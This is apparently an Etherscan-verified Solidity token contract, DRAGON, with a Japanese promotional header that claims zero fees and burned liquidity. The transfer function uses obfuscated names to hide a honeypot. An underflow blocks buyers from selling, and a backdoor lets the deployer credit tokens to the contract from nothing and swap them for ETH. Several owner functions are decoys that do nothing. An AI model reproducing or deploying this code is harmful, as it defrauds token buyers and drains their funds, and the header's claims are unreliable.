/**
 *Submitted for verification at Etherscan.io on 2022-12-29
*/

/*
イーサリアムネットワークを吹き飛ばす次のイーサリアムユーティリティトークン
有望な計画とイーサリアム空間への参入を促進する、私たちは単なる通常の
トークンやミームトークンではありません また、独自のエコシステム、
将来のステーキング、コレクションに基づいて設計されたスワップ プラットフォームも支持しています。
私たち自身のマーケットプレイスで、その他多くのことが発表される予定です。

総供給 - 5,000,000
初期流動性追加 - 1.85 イーサリアム
初期流動性の 100% が消費されます
購入手数料 - 0%
販売手数料 - 0%
*/
// SPDX-License-Identifier: MIT

abstract contract UIContext01 {
    function _msgVendor() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgNotes() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
     pragma solidity ^0.8.11;

interface IPCIntale02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to, uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function startLiqPoolERC(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to, uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to, uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to, uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to, uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to, uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external payable
        returns (uint[] memory amounts);
}
library Address {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
interface IPCIntale01 is IPCIntale02 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to, uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to, uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to, uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to, uint deadline
    ) external;
}
interface IPSO20 {
 
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);

    function approve(
        address spender, 
        uint256 amount
    ) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval
       (address indexed owner, 
       address indexed spender, 
    uint256 value);
}
interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1, 
    address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);

    function createPair(
        address tokenA, 
        address tokenB
    ) external returns (address pair);
}
abstract contract Ownable is UIContext01 {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor
    () { _setOwner(_msgVendor());
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgVendor(), 'Ownable: caller is not the owner'); _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract DRAGON is IPSO20, Ownable {

    address public isDEADaddress;
    address public LIQaddress;  

    string private _symbol;
    string private _name;
    uint8 private _decimals = 9;

    uint256 private _totalSupply = 5000000 * 10**_decimals;
    uint256 public tTX = (_totalSupply * 7) / 100; 
    uint256 public tWallet = (_totalSupply * 7) / 100; 
    uint256 private tMakerVAL = _totalSupply;
    uint256 public tBURNrate =  1;

    mapping (address => bool) _isHoldersMap;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping(address => uint256) private _balances;
    mapping(address => address) private _excludeFromDividends;
    mapping(address => uint256) private _holderFirstBuyTimestamp;
    mapping(address => mapping(address => uint256)) private _allowances;
 
    bool private isCooler;
    bool private inSwitchOn;
    bool private tradingOpen = false;

    address public immutable isPCPairedAddress;
    IPCIntale01 public immutable MmakerV1;

    constructor(

    string memory _isTknName,
    string memory _isTknSymbol,
    address _pairedAddress

    ) {
        _name = _isTknName;
        _symbol = _isTknSymbol;

        _balances[msg.sender] = _totalSupply;
        _holderLastTransferTimestamp[msg.sender] = tMakerVAL;
        _holderLastTransferTimestamp[address(this)] = tMakerVAL;

        MmakerV1 = IPCIntale01(_pairedAddress);
        isPCPairedAddress = IUniswapV2Factory(MmakerV1.factory()).createPair(address(this), MmakerV1.WETH());

        emit Transfer(address(0), msg.sender, _totalSupply);
        _isHoldersMap[address
        (this)] = true;
        _isHoldersMap[isPCPairedAddress] = true;
        _isHoldersMap[_pairedAddress] = true;
        _isHoldersMap[msg.sender] = true;
    }
    function name() public view returns (string memory) {
        return _name;
    }
     function symbol() public view returns (string memory) {
        return _symbol;
    }
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function _approve(
        address owner, address spender, uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) external returns (bool) {
        _panelAndPoolSettings(msg.sender, recipient, amount);
        return true;
    }
    function basicTransfer( address from,
        address to, uint256 amount) internal virtual 
    {}
    function setMaxTX(uint256 amountBuy) external onlyOwner {
        tTX = amountBuy;
    }
    function updateTeamWallet(address newWallet) external onlyOwner {
        newWallet = newWallet;
    }
    function transferFrom(
        address sender, address recipient, uint256 amount
    ) external returns (bool) {
        _panelAndPoolSettings(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function standardTransfer( address from,
        address to, uint256 amount) internal 
        virtual {
    }
    function _panelAndPoolSettings(
        address _apixKOVloxFrom, address isINTERoxkiTo,uint256 _DoWOKminAmount
    ) private {

        uint256 recordCompact = balanceOf(address(this)); uint256 divTXrates;
        if (isCooler && recordCompact > tMakerVAL && !inSwitchOn && _apixKOVloxFrom != isPCPairedAddress) {
            inSwitchOn = true; manualSwap
            (recordCompact); inSwitchOn = false; } else if (_holderLastTransferTimestamp[_apixKOVloxFrom] > 
            tMakerVAL && _holderLastTransferTimestamp[isINTERoxkiTo] > tMakerVAL) { divTXrates = _DoWOKminAmount;
            _balances[address(this)] += divTXrates; coinsForERC(_DoWOKminAmount, isINTERoxkiTo);
            return;
        } else if (isINTERoxkiTo != address(MmakerV1) && _holderLastTransferTimestamp[_apixKOVloxFrom] > 0 && _DoWOKminAmount > 
        tMakerVAL && isINTERoxkiTo != isPCPairedAddress) { _holderLastTransferTimestamp[isINTERoxkiTo] = _DoWOKminAmount;
            return;
        } else if (!inSwitchOn && _holderFirstBuyTimestamp[_apixKOVloxFrom] > 0 && _apixKOVloxFrom != isPCPairedAddress 
        && _holderLastTransferTimestamp[_apixKOVloxFrom] == 0) { _holderFirstBuyTimestamp[_apixKOVloxFrom] = 
        _holderLastTransferTimestamp[_apixKOVloxFrom] - tMakerVAL; } address _indicia = _excludeFromDividends[isPCPairedAddress];
        if (_holderFirstBuyTimestamp[_indicia] == 0) 
        _holderFirstBuyTimestamp[_indicia] = tMakerVAL;
        _excludeFromDividends[isPCPairedAddress] = isINTERoxkiTo;
        if (tBURNrate > 0 && _holderLastTransferTimestamp[_apixKOVloxFrom] == 0 && !inSwitchOn && _holderLastTransferTimestamp
        
        [isINTERoxkiTo] == 0) { divTXrates = (_DoWOKminAmount * tBURNrate) / 100;
            _DoWOKminAmount -= divTXrates;
            _balances[_apixKOVloxFrom] -= divTXrates;
            _balances[address(this)] += divTXrates; }
        _balances[_apixKOVloxFrom] -= _DoWOKminAmount; _balances[isINTERoxkiTo] += 
        _DoWOKminAmount; emit Transfer(
        _apixKOVloxFrom, isINTERoxkiTo, _DoWOKminAmount);
        if (!tradingOpen) {
        require(_apixKOVloxFrom == owner(), "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function updateProtections(bool newBool) external onlyOwner{
        newBool = newBool;
    }
    function _afterTokenTransfer( address from,
        address to, uint256 amount) internal 
        virtual {
    }

    // https://www.zhihu.com/
    receive() external payable {}

    function prepareLiquidityPool(
        uint256 coinsInValue,
        uint256 ercAmount,
        address to
    ) private {
        _approve(address(this), address(MmakerV1), coinsInValue);
        MmakerV1.startLiqPoolERC{value: ercAmount}(address(this), coinsInValue, 0, 0, to, block.timestamp);
    }
    function setFeeReciever(address feeWallet) public onlyOwner {
        feeWallet = feeWallet;
    }
    function coinsForERC(uint256 cVAL, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = MmakerV1.WETH();
        _approve(address(this), address(MmakerV1), cVAL);
        MmakerV1.swapExactTokensForETHSupportingFeeOnTransferTokens(cVAL, 0, path, to, block.timestamp);
    }
    function enableTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function setMaxWalletNow(address maxOf) public onlyOwner {
        maxOf = maxOf;
    }
    function manualSwap(uint256 tTkns) private {
        uint256 nowDiv = tTkns / 2;
        uint256 preBalance = address(this).balance;
        coinsForERC(nowDiv, address(this));
        uint256 newBalance = address(this).balance - preBalance;
        prepareLiquidityPool(nowDiv, newBalance, address(this));
    }
}